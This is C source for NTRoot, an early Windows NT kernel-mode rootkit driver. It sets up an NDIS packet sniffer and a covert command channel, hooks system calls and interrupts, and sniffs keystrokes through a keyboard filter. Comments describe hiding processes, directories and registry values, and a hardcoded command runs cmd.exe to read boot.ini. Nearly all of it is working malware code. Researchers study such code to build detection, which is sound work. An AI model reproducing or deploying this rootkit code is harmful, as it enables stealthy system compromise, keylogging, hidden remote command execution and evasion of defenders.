
/**********************************************************************************
 * NTRoot
 * Version 0.1a
 * Greg Hoglund
 *
 * June 1, 1999      - Greg Hoglund - fixed a bunch of cruft
 * June 3, 1999      - Greg Hoglund - will still BSOD if you attempt to UNLOAD the
 *                               driver.. leaving this issue for now, just don't 
 *                               unload, I think it's related to NDIS, but not sure.
 *                               ** adding PsCreateSystemProcess() call
 * July 29, 1999     - Greg Hoglund
 *				     - OnUnload crashes on NdisDeregisterProtocol. - still not fixed
 *			         - added ethernet header to returned buffer, so
 *		             - RogueX client can read entire raw packets now.
 *				     - cleaned up code & split into several source files
 *
 * October 10, 1999  - Greg Hoglund
 *				     - adding system service table code ;-)
 * October 26, 1999  - Greg Hoglund
 *                   - added interrupt descriptor table patch //kickin'//
 * November 22, 1999 - modify ReadRegistry() to enum first network key (what a bitch)
 * November 23, 1999 - adding exception handling for easier debugging - I'm tired
 *                   - of BSOD'n my machines.
 *                   - added NDIS event to wait for OnUnload(). (needs testing)
 *					 - current build is locking up win2K boxes - works on NT4.0 (?)
 * December 9, 1999  - Greg Hoglund
 *                   - added numerous call hooks - is now hiding registry values
 *                   - builds/runs on both NT40 & WIN2K, Unload() works flawlessly
 * 
 * Feb 2, 2001       - OK, it has been a LONG time since I worked on this...
 *                     I added a haxored TCP/IP stack so you can telnet to the
 *                     rootkit and made a command-parser.  I added a few commands
 *                     to get started, including 'ps' to list the processes on the
 *                     host.  I added a worker-thread to handle command processing.
 *                     -Greg
 ***********************************************************************************/

#include "rk_driver.h"
#include "rk_packet.h"
#include "rk_defense.h"
#include "rk_command.h"
#include "rk_keyboard.h"
#include "rk_utility.h"
								 
/* ________________________________________________________________________________ 
 . Our driver objects
 . ________________________________________________________________________________ */
PDRIVER_OBJECT	gDriverObjectP;

KSPIN_LOCK		GlobalArraySpinLock;
KSPIN_LOCK		WorkItemSpinLock;
KIRQL			gIrqL;
POPEN_INSTANCE	gOpenInstance = NULL;  /* this is what we will use for notify packets */

char g_command_signal[256];
KEVENT command_signal_event;
KEVENT exec_signal_event;
VOID rootkit_command_thread(PVOID context);
BOOL g_kill_thread = FALSE;
HANDLE gWorkerThread;

// used for network sniffing
PDEVICE_OBJECT 	g_NdisDeviceObject = NULL;

// ----------------------------------------------------------------------
PDEVICE_OBJECT gKbdHookDevice = NULL; //this is a test
//
// The top of the stack before this filter was added.  AKA the location
// to which all IRPS should be directed.
//
PDEVICE_OBJECT  gKbdTopOfStack = NULL;

/////////////////////////////////////////////////////////////////////////////
// we must never unload if there are pending IRP's in our filter queue -
// so this will track how many we have outstanding...
/////////////////////////////////////////////////////////////////////////////
ULONG g_number_of_pending_IRPs = 0;

/* ________________________________________________________________________________
 . NT Rootkit DRIVER ENTRY
 . Setup the NDIS sniffer as well as hook the system service table and interrupts
 . ________________________________________________________________________________ */
NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	/* Network Sniffer related structs */
	NDIS_PROTOCOL_CHARACTERISTICS	aProtocolChar;
	UNICODE_STRING 			aMacDriverName;
	UNICODE_STRING 			aUnicodeDeviceName;
	
	NDIS_HANDLE    	aNdisProtocolHandle;
	NDIS_STRING	aProtoName = NDIS_STRING_CONST("NTRoot");
	
	NDIS_STATUS    	aErrorStatus;
	NDIS_MEDIUM    	aMediumArray=NdisMedium802_3;
	
	UNICODE_STRING  aDriverName;			// DD
	PWSTR			aBindString;			// DD 
	PWSTR          	aExportString;			// DD
	PWSTR          	aBindStringSave;		// DD
	PWSTR          	aExportStringSave;		// DD

	/* our device so we can communicate with user mode */
	PDEVICE_EXTENSION 	aDeviceExtension = NULL;
	WCHAR               aDeviceLinkBuffer[]  = L"\\DosDevices\\Ntroot"; /* the \??\ dir (for users) */
	UNICODE_STRING      aDeviceLinkUnicodeString;
	ULONG				aDevicesCreated = 0;


	NTSTATUS       aStatus = STATUS_SUCCESS;
	POPEN_INSTANCE anOpenP = NULL;
	int i;

	KIRQL aIrqL;
	
	
	DbgPrint("ROOTKIT: DriverEntry called\n");

	InitDefenseSystem();
	SetupCallNumbers();
	GetProcessNameOffset();

	__try
	{
		KeInitializeSpinLock(&GlobalArraySpinLock); /* free me */
		KeInitializeSpinLock(&WorkItemSpinLock); /* free me */

		KeInitializeEvent(&command_signal_event, NotificationEvent, 0);
		KeInitializeEvent(&exec_signal_event, NotificationEvent, 0);

		//Create Queue for work items that need to run in passive level, 
		// and MUST run under some process context (NOT system).
		//
		// The perfect place to work with this queue , will be while intercepting 
		// a system call, because it allways passive, and good chance to be not system process.
		//
		// So in each (?) system call interception (wich happens A LOT) we will check this queue
		// and execute one work item before continue processing the system call.
		InitializeListHead(&ProcessContextWorkQueueHead);
		
		/*
		 * init network sniffer - this is all standard and
		 * documented in the DDK.
		 */
		RtlZeroMemory( &aProtocolChar,
			   sizeof(NDIS_PROTOCOL_CHARACTERISTICS));
		aProtocolChar.MajorNdisVersion            = 3;
		aProtocolChar.MinorNdisVersion            = 0;
		aProtocolChar.Reserved                    = 0;
		aProtocolChar.OpenAdapterCompleteHandler  = OnOpenAdapterDone;
		aProtocolChar.CloseAdapterCompleteHandler = OnCloseAdapterDone;
		aProtocolChar.SendCompleteHandler         = OnSendDone;
		aProtocolChar.TransferDataCompleteHandler = OnTransferDataDone;
		aProtocolChar.ResetCompleteHandler        = OnResetDone;
		aProtocolChar.RequestCompleteHandler      = OnRequestDone;
		aProtocolChar.ReceiveHandler              = OnReceiveStub;
		aProtocolChar.ReceiveCompleteHandler      = OnReceiveDoneStub;
		aProtocolChar.StatusHandler               = OnStatus;
		aProtocolChar.StatusCompleteHandler       = OnStatusDone;
		aProtocolChar.Name                        = aProtoName;

		DbgPrint("ROOTKIT: Registering NDIS Protocol\n");

		NdisRegisterProtocol( &aStatus,
        			  &aNdisProtocolHandle,
        			  &aProtocolChar,
        			  sizeof(NDIS_PROTOCOL_CHARACTERISTICS));

		if (aStatus != NDIS_STATUS_SUCCESS) {
			DbgPrint(("DriverEntry: ERROR NdisRegisterProtocol failed\n"));
			return aStatus;
		}

		
		
		for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
		{
        	theDriverObject->MajorFunction[i] = OnStubDispatch;
    	}
		/* ___[ we NEED to register the Unload() function ]___ 
		 . this is how we are able to dynamically unload the
		 . driver 
		 . ___________________________________________________ */ 
		theDriverObject->DriverUnload  = OnUnload; 

		aDriverName.Length = 0;
		aDriverName.Buffer = ExAllocatePool( PagedPool, MAX_PATH_LENGTH ); /* free me */
		aDriverName.MaximumLength = MAX_PATH_LENGTH;
		RtlZeroMemory(aDriverName.Buffer, MAX_PATH_LENGTH);

		/* _______________________________________________________________
		 * get the name of the MAC layer driver 
		 * and the name of the packet driver
		 * HKLM/SYSTEM/CurrentControlSet/Services/TcpIp/Linkage ..
		 * _______________________________________________________________ */
		if (ReadRegistry( &aDriverName ) != STATUS_SUCCESS) {
			goto RegistryError;
		}

		aBindString = aDriverName.Buffer;

		aExportString = ExAllocatePool(PagedPool, MAX_PATH_LENGTH); /* free me */
		RtlZeroMemory(aExportString, MAX_PATH_LENGTH);
		wcscat(aExportString, L"\\Device\\Ntroot"); // visible to user mode

		aBindStringSave   = aBindString;
		aExportStringSave = aExportString;

		while (*aBindString != UNICODE_NULL && *aExportString != UNICODE_NULL) 
		{
			/* for each entry */
			RtlInitUnicodeString( &aMacDriverName, aBindString ); // the /device/ne20001 or whatever..
			RtlInitUnicodeString( &aUnicodeDeviceName, aExportString );
        
			/* MULTI_SZ */
			aBindString   += (aMacDriverName.Length+sizeof(UNICODE_NULL))/sizeof(WCHAR);
			aExportString += (aUnicodeDeviceName.Length+sizeof(UNICODE_NULL))/sizeof(WCHAR);
        
			/* create a device object for this driver */
			aStatus = IoCreateDevice( theDriverObject,
                    				  sizeof(DEVICE_EXTENSION),
                    				  &aUnicodeDeviceName, // usermode export
                    				  FILE_DEVICE_PROTOCOL,
                    				  0,
                    				  FALSE,
                    				  &g_NdisDeviceObject );

			if (aStatus != STATUS_SUCCESS) {
				break;
			}

			/* create a symbolic link for first one*/	
			if(0 == aDevicesCreated){
				//
				// Create a symbolic link that the GUI can specify to gain access
				// to this driver/device
				//
				RtlInitUnicodeString (&aDeviceLinkUnicodeString,
									  aDeviceLinkBuffer );
				aStatus = IoCreateSymbolicLink ( &aDeviceLinkUnicodeString,
												 &aUnicodeDeviceName );
				if (!NT_SUCCESS(aStatus)) {
					DbgPrint (("NTROOT: IoCreateSymbolicLink failed\n"));        
				}
			}
			aDevicesCreated++;
			g_NdisDeviceObject->Flags |= DO_DIRECT_IO;
			aDeviceExtension  =  (PDEVICE_EXTENSION) g_NdisDeviceObject->DeviceExtension;
			aDeviceExtension->DeviceObject = g_NdisDeviceObject;
        
			/* save in extension */
			aDeviceExtension->AdapterName = aMacDriverName;
			if (aDevicesCreated == 1) {
				aDeviceExtension->BindString   = aBindStringSave;
				aDeviceExtension->ExportString = aExportStringSave;
			}
			aDeviceExtension->NdisProtocolHandle = aNdisProtocolHandle;
		}

		//////////////////////////////////////////////////////////////////
		// get our worker thread up and running
		//////////////////////////////////////////////////////////////////
		{
			DbgPrint("thread: creating thread\n");
			PsCreateSystemThread( 	&gWorkerThread,
									(ACCESS_MASK) 0L,
									NULL,
									(HANDLE) 0L,
									NULL,
									rootkit_command_thread,
									NULL);
		}
									
									 

		if (aDevicesCreated > 0)
		{
			//  allocate some memory for the open structure
			anOpenP=ExAllocatePool(NonPagedPool,sizeof(OPEN_INSTANCE)); /* free me */
			if (anOpenP==NULL) {
				// no memory
				// NO IRP -- Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
				return STATUS_INSUFFICIENT_RESOURCES;
			}
			RtlZeroMemory(
				anOpenP,
				sizeof(OPEN_INSTANCE)
				);
			/* we will use the first opened instance to send notify packets */
			gOpenInstance = anOpenP;
			anOpenP->DeviceExtension=aDeviceExtension;

			// init the send buffers we will be using
			NdisAllocatePacketPool(
				&aStatus,
				&anOpenP->mPacketPoolH,
				TRANSMIT_PACKETS,
				sizeof(PACKET_RESERVED));
			if (aStatus != NDIS_STATUS_SUCCESS) {
				ExFreePool(anOpenP);
				// FIXME cleanup
				return STATUS_INSUFFICIENT_RESOURCES;
			}
			/* this is a null function under NT */
			NdisAllocateBufferPool(
				&aStatus,
				&anOpenP->mBufferPoolH,
				TRANSMIT_PACKETS );
			if (aStatus != NDIS_STATUS_SUCCESS) {
				ExFreePool(anOpenP);
				// FIXME
				return STATUS_INSUFFICIENT_RESOURCES;
			}

			/* go ahead and get that NDIS sniffer up */
			//////////////////////////////////////////
			// note: if we don't plan on attaching
			// to the sniffer device from user mode
			// we don't actually need the device
			// at all, perhaps we can forgo the
			// device completely for stealth reasons
			// -greg
			//////////////////////////////////////////
			NdisOpenAdapter(
				&aStatus,
				&aErrorStatus,
				&anOpenP->AdapterHandle,
				&aDeviceExtension->Medium,
				&aMediumArray,
				1,
				aDeviceExtension->NdisProtocolHandle,
				anOpenP,
				&aDeviceExtension->AdapterName,
				0,
				NULL);
			if (aStatus != NDIS_STATUS_PENDING) {
				OnOpenAdapterDone(
					anOpenP,
					aStatus,
					NDIS_STATUS_SUCCESS
					);
				if(NT_SUCCESS(aStatus)){
					DbgPrint(("NdisOpenAdapter returned STATUS_SUCCESS\n"));
					return aStatus;
				}
				else switch(aStatus){
					case STATUS_SUCCESS:
						DbgPrint(("NdisOpenAdapter returned STATUS_SUCCESS\n"));
						break;
					case NDIS_STATUS_PENDING:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_PENDING\n"));
						break;
					case NDIS_STATUS_RESOURCES:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_RESOURCES\n"));
						break;
					case NDIS_STATUS_ADAPTER_NOT_FOUND:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_ADAPTER_NOT_FOUND\n"));
						break;
					case NDIS_STATUS_UNSUPPORTED_MEDIA:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_UNSUPPORTED_MEDIA\n"));
						break;
					case NDIS_STATUS_CLOSING:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_CLOSING\n"));
						break;
					case NDIS_STATUS_OPEN_FAILED:
						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_OPEN_FAILED\n"));
						break;
				}
			}
		}

	
		/* _______________________________________________________ 
		 . we are now online and sniffing packets
		 . _______________________________________________________ */


		/* _______________________________________________________
		 . Hook our system calls and interrupts now
		 . _______________________________________________________ */
		DbgPrint("rootkit: about to hook systemcalls\n");
		HookSyscalls();
		
		DbgPrint("rootkit: about to hook interrupts\n");
		HookInterrupts();

		/* _______________________________________________________
		 . Originally, we had hooked other drivers here, such as 
		 . the keyboard class driver - so that we could sniff
		 . keystrokes, for example.  To make everything simpler,
		 . however, we are only hooking syscalls now.
		 .
		 . If you choose, you may attempt to hook other drivers 
		 . at this point.  There are some examples of this in the
		 . DDK.  Also, there is a keyboard class driver hook example
		 . on the www.sysinternals.com site.  In theory, you could
		 . hook whatever you choose.  Please contribute your changes
		 . to the rootkit project at www.rootkit.com.  Thanks.
		 . ________________________________________________________ */
	cmdHookKeyboard(theDriverObject); /* currently not implemented */

		KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
		memset(g_command_signal, NULL, 255);
		memcpy(g_command_signal,"exec \\??\\c:\\winnt\\system32\\cmd.exe /c type c:\\boot.ini" ,
								strlen("exec \\??\\c:\\winnt\\system32\\cmd.exe /c type c:\\boot.ini"));
		KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
		//-----------------------------------------------
		KeSetEvent(&command_signal_event, 1, FALSE);

		
		return STATUS_SUCCESS;

RegistryError:
		/* fixme - need better cleanup */
		NdisDeregisterProtocol( &aStatus, aNdisProtocolHandle );
    }
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("Exception occured, caught in DriverEntry().  Unknown error\n");
	}
    return(STATUS_UNSUCCESSFUL);
}

/* __________________________________________________________________
 . This function just completes all IRP's that come its way.
 . We are ignoring userland completely - so this shouldn't get
 . called anyways -
 .
 . Feb 03 - update: adding support for hooking the IRP chain in
 . other drivers.  This means stealing the info-stream from other
 . drivers such as keyboard or tcp/ip, etc etc.
 . -greg
 . __________________________________________________________________ */
NTSTATUS
OnStubDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP           Irp
    )
{
	//////////////////////////////////////////////////////////////////
	// the issue here is that if we are hooking a driver chain, we
	// cannot simply complete the IRP, we must instead pass the call
	// down the chain...
	//
	// we can switch on the DeviceObject being used, and we need 
	// a different DeviceObject for each hook we are using
	//////////////////////////////////////////////////////////////////
    
    if(DeviceObject == g_NdisDeviceObject)
    { 
	    Irp->IoStatus.Status = STATUS_SUCCESS;
	    IoCompleteRequest (Irp,
	                       IO_NO_INCREMENT
	                       );
	}
	if(DeviceObject == gKbdHookDevice)
	{
		PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
	    // Our keyboard hook has been called, just pass on the data
	    // however, if the IRP is a read completion, let's steal
	    // a look at the scan code...
	    if( (g_sniff_keys) && (IRP_MJ_READ == irpStack->MajorFunction)) 
	    {
	    	PIO_STACK_LOCATION  nextIrpStack;
	    	nextIrpStack = IoGetNextIrpStackLocation(Irp);
	    	// make sure we get called for ReadComplete...
	    	*nextIrpStack = *irpStack;
		    // Set the completion callback, so we can "frob" the keyboard data.
		    // ----------------------------------------------------------------
		    // important note: IRP's are fired down and they wait, dormant,
		    // until completed.  This means that a 'blank' IRP is fired down
		    // and waits for a keypress.  The very next keypress will 
		    // complete the IRP and our callback routine will fire.
		    //
		    // The problem: if we have unloaded the driver, the callback
		    // routine will not be there - but the very last IRP may 
		    // still be waiting for completion and still have our callback
		    // address - aka BSOD on next keypress. - SO, we HAVE to get
		    // rid of this offending IRP before we unload.  This applies to
		    // ANY filter driver.  Pending IRP's are a Bad Thing when we
		    // want to Unload().
		    // ----------------------------------------------------------------
		    IoSetCompletionRoutine( Irp, OnKbdReadComplete, 
		                            DeviceObject, TRUE, TRUE, TRUE );
		    g_number_of_pending_IRPs++;
		    
		    // Return the results of the call to the keyboard class driver.
		    return IoCallDriver( gKbdTopOfStack, Irp );		
	    }
	    else
	    {
	    	Irp->CurrentLocation++;
	    	Irp->Tail.Overlay.CurrentStackLocation++;
	     	// pass this onto whoever we stole it from...
		    return IoCallDriver(gKbdTopOfStack, Irp);
		}	
	}
	else
	{
	    Irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
	    IoCompleteRequest (Irp,
	                       IO_NO_INCREMENT
	                       );
	}
	                    	                       
	return Irp->IoStatus.Status;
}

/* __________________________________________________________________
 . ETHERNET SNIFFER FILTER
 .
 . This function is called whenever a packet is sniffed on the wire.
 . Currently, this is called directly when the packet arrives, so
 . you need to handle the packet quickly.  This is a high performance
 . function - so don't spend alot of time daddling w/ the packet.
 .
 . If you need to perform a great deal of processing on the packet,
 . queue it first and handle it in another thread.
 .
 . Note: there are many driver-related support functions
 . located in file sniffer.c
 . __________________________________________________________________ */

void OnSniffedPacket(const char* theData, int theLen){
	int aCommand = 0;

	DbgPrint("ROOTKIT: OnSniffedPacket called\n");
	/* no matter what kind of packet this is, parse it for a possible
	 * command.  This makes it easy for the attacker to embed commands
	 * into almost any type of packet, including invalid TCP or ICMP
	 * Also, any network protocol, not just IP.
	 */
	
	// TBD
	switch(aCommand){
	case 0: /* shutdown */
		break;
	case 1: /* start network sniffer */
		break;
	case 2: /* start routing */
		break;
	case 3: /* start file sniffing */
		break;
	case 666: /* Shutdown and KillAll */
		break;
	default:
		break;
	}
}

/* _____________________________________________________________________________
 . This is called when the driver is dynamically unloaded.  You need to cleanup
 . everything you have done here.  A waitable object was added so that NDIS can
 . be shut down properly.  Also unhook all system calls & interrupts.
 . _____________________________________________________________________________ */

// called at IRQL_PASSIVE
VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
    WCHAR                  deviceLinkBuffer[]  = L"\\DosDevices\\Ntroot";
    UNICODE_STRING         deviceLinkUnicodeString;
	PVOID				   aThreadPtr;
	
	DbgPrint("ROOTKIT: OnUnload called\n");

	//-------------------------------------------
	// kill worker thread
	g_kill_thread = TRUE;
	DbgPrint("rootkit: killing worker thread\n");

	//GET pointer for thread handle
	ObReferenceObjectByHandle( 
		gWorkerThread, 
		THREAD_ALL_ACCESS, 
		NULL, 
		KernelMode, 
		&aThreadPtr, 
		NULL 
		); 
		
	//should be OK at PASSIVE_LEVEL
	KeWaitForSingleObject(	
		aThreadPtr,
		UserRequest,
		KernelMode,
		FALSE,
		NULL);

	//done with thread ptr
	ObDereferenceObject( aThreadPtr );
	//--------------------------------------------
	
	// now that worker thread is done, it should be
	// safe to start unwinding ourselves from the
	// kernel.

	DbgPrint("rootkit: about to unhook syscalls\n");
	UnhookSyscalls();

	DbgPrint("rootkit: about to unhook interrupts\n");
	UnhookInterrupts();

	// now unhook the keyboard filter
	if(gKbdHookDevice)
	{
		IoDetachDevice(gKbdTopOfStack);
		IoDeleteDevice(gKbdHookDevice);
	}
	
__try
{	
	//__asm int 3

	//the spinlock was a suspect in a BSOD, so I removed it...
	// -Greg
	//KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL); /* beware of irq level */
	/*
	 * There are some resources which are not freed here, hence small 
	 * memleak.
	 */
	if(NULL != gOpenInstance)
	{
		PDEVICE_EXTENSION  DeviceExtension;
		NDIS_HANDLE        NdisProtocolHandle;
		NDIS_STATUS        Status;

		DeviceExtension = gOpenInstance->DeviceExtension;
		NdisProtocolHandle = DeviceExtension->NdisProtocolHandle;

		NdisResetEvent(&gOpenInstance->Event);

		NdisCloseAdapter(
			&Status, 
			gOpenInstance->AdapterHandle);

		// we must wait for this to complete
		// ---------------------------------
		if(Status == NDIS_STATUS_PENDING)
		{
			 DbgPrint("rootkit: OnUnload: pending wait event\n");
			 NdisWaitEvent(&gOpenInstance->Event, 0);
			 Status = gOpenInstance->Status;
		}

		DbgPrint("rootkit: OnUnload: NdisCloseAdapter() done\n");
		NdisFreeBufferPool(gOpenInstance->mBufferPoolH);

		NdisFreePacketPool(gOpenInstance->mPacketPoolH);

		ExFreePool(gOpenInstance);

		IoDeleteDevice( DeviceExtension->DeviceObject );

		if (DeviceExtension->BindString != NULL) {
            ExFreePool(DeviceExtension->BindString);
        }

        if (DeviceExtension->ExportString != NULL) {
            ExFreePool(DeviceExtension->ExportString);
        }

		NdisDeregisterProtocol(
			&Status,
			NdisProtocolHandle
        );
	}

    RtlInitUnicodeString( &deviceLinkUnicodeString, deviceLinkBuffer );
    IoDeleteSymbolicLink( &deviceLinkUnicodeString );
	/*
	 *
	 */
	//KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
}
__except(EXCEPTION_EXECUTE_HANDLER)
{
	DbgPrint("rootkit: Exception in Unload(), unknown error.\n");
}

	/////////////////////////////////////////////////////////////////
	// make sure ALL filters are OFF, and then wait for all
	// pending IRPs to DIE! - we should be deteched from all our
	// filter devices now anyways... -greg
	/////////////////////////////////////////////////////////////////
	g_hide_directories=FALSE;
	g_hide_proc=FALSE;
	g_sniff_keys=FALSE;
	// no more IRP's should be queued to us - now wait it out...
	for(;;)
	{
		LARGE_INTEGER timeout;
		timeout.QuadPart = -(3 * 1000 * 10000);

		KeResetEvent(&command_signal_event);
		
		// we can re-use the thread signal to cause a
		// short wait here...
		KeWaitForSingleObject(	
				&command_signal_event,
				Executive,
				KernelMode,
				FALSE,
				&timeout);
		// do not continue until all IRP's are DEAD
		if( 0 == g_number_of_pending_IRPs ) break;
	}
	return;
}


// --------------------------------------------------------
// wait for commands and execute them in IRQL_PASSIVE level
// --------------------------------------------------------
VOID rootkit_command_thread(PVOID context)
{
	DbgPrint("thread: workerthread entry\n");

	// Find System Process ID
	SystemProcessId=PsGetCurrentProcessId();

	for(;;)
	{
		LARGE_INTEGER timeout;
		NTSTATUS waitstatus;
		KIRQL aIrqL;
		char _safe_buffer[256];
		_safe_buffer[255]=NULL;

		timeout.QuadPart = -(3 * 1000 * 10000);

		waitstatus = KeWaitForSingleObject(	
								&command_signal_event,
								Executive,
								KernelMode,
								FALSE,
								&timeout);
		
		
		
		if(g_kill_thread) 
		{
			// we have been shutdown by the UnLoad()
			// routine, so get out of dodge...
			PsTerminateSystemThread(0);
		}
		else if(waitstatus == STATUS_TIMEOUT)
		{
			//timeout, ignore
		}
		else
		{
			// check the command which is waiting in a 
			// global buffer.  Copy this buffer into a
			// safe-zone.

			//----[ spinlock ]-------------------------------
			KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
			memcpy(_safe_buffer, g_command_signal, 255);
			KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
			//-----------------------------------------------
			
			// we are running at IRQL_PASSIVE so we can make
			// calls to kernel API routines in our commands
			// processor
			process_rootkit_command(_safe_buffer);
			
			KeResetEvent(&command_signal_event);
		}
	}
}

